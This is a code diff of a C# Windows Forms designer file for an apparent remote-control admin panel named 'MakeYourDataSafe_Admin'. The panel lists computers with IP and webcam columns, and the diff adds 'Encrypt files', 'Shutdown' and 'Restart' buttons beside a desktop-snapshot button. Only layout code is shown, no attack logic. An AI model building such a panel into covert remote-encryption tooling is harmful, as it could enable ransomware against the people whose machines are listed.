@@ -28,6 +28,7 @@
         /// </summary>
         private void InitializeComponent()
         {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Main));
             this.Computers = new System.Windows.Forms.DataGridView();
             this.ID = new System.Windows.Forms.DataGridViewTextBoxColumn();
             this.ip = new System.Windows.Forms.DataGridViewTextBoxColumn();
@@ -38,6 +39,9 @@
             this.web = new System.Windows.Forms.Button();
             this.snapshot = new System.Windows.Forms.Button();
             this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.encrypt = new System.Windows.Forms.Button();
+            this.shutdown = new System.Windows.Forms.Button();
+            this.restart = new System.Windows.Forms.Button();
             ((System.ComponentModel.ISupportInitialize)(this.Computers)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
             this.SuspendLayout();
@@ -61,7 +65,7 @@
             this.Computers.ReadOnly = true;
             this.Computers.RowHeadersVisible = false;
             this.Computers.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
-            this.Computers.Size = new System.Drawing.Size(401, 321);
+            this.Computers.Size = new System.Drawing.Size(401, 399);
             this.Computers.StandardTab = true;
             this.Computers.TabIndex = 1;
             this.Computers.SelectionChanged += new System.EventHandler(this.rowChange);
@@ -132,22 +136,55 @@
             this.snapshot.TabIndex = 5;
             this.snapshot.Text = "Take Desktop Pic";
             this.snapshot.UseVisualStyleBackColor = true;
+            this.snapshot.Click += new System.EventHandler(this.snapshot_Click);
             // 
             // pictureBox1
             // 
-            this.pictureBox1.Image = global::MakeYourDataSafe_Admin.Properties.Resources.Grandma;
-            this.pictureBox1.Location = new System.Drawing.Point(407, 216);
+            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+            this.pictureBox1.Location = new System.Drawing.Point(407, 300);
             this.pictureBox1.Name = "pictureBox1";
-            this.pictureBox1.Size = new System.Drawing.Size(130, 111);
+            this.pictureBox1.Size = new System.Drawing.Size(121, 105);
             this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
             this.pictureBox1.TabIndex = 6;
             this.pictureBox1.TabStop = false;
+            // 
+            // encrypt
+            // 
+            this.encrypt.Location = new System.Drawing.Point(407, 174);
+            this.encrypt.Name = "encrypt";
+            this.encrypt.Size = new System.Drawing.Size(121, 36);
+            this.encrypt.TabIndex = 7;
+            this.encrypt.Text = "Encrypt files";
+            this.encrypt.UseVisualStyleBackColor = true;
+            this.encrypt.Click += new System.EventHandler(this.encrypt_Click);
+            // 
+            // shutdown
+            // 
+            this.shutdown.Location = new System.Drawing.Point(407, 216);
+            this.shutdown.Name = "shutdown";
+            this.shutdown.Size = new System.Drawing.Size(121, 36);
+            this.shutdown.TabIndex = 8;
+            this.shutdown.Text = "Shutdown";
+            this.shutdown.UseVisualStyleBackColor = true;
+            this.shutdown.Click += new System.EventHandler(this.shutdown_Click);
+            // 
+            // restart
+            // 
+            this.restart.Location = new System.Drawing.Point(407, 258);
+            this.restart.Name = "restart";
+            this.restart.Size = new System.Drawing.Size(121, 36);
+            this.restart.TabIndex = 9;
+            this.restart.Text = "Restart";
+            this.restart.UseVisualStyleBackColor = true;
             // 
             // Main
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(540, 333);
+            this.ClientSize = new System.Drawing.Size(540, 422);
+            this.Controls.Add(this.restart);
+            this.Controls.Add(this.shutdown);
+            this.Controls.Add(this.encrypt);
             this.Controls.Add(this.pictureBox1);
             this.Controls.Add(this.snapshot);
             this.Controls.Add(this.web);
@@ -182,6 +219,9 @@
         private System.Windows.Forms.DataGridViewTextBoxColumn name;
         private System.Windows.Forms.DataGridViewTextBoxColumn webcam;
         private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.Button encrypt;
+        private System.Windows.Forms.Button shutdown;
+        private System.Windows.Forms.Button restart;
     }
 }
 
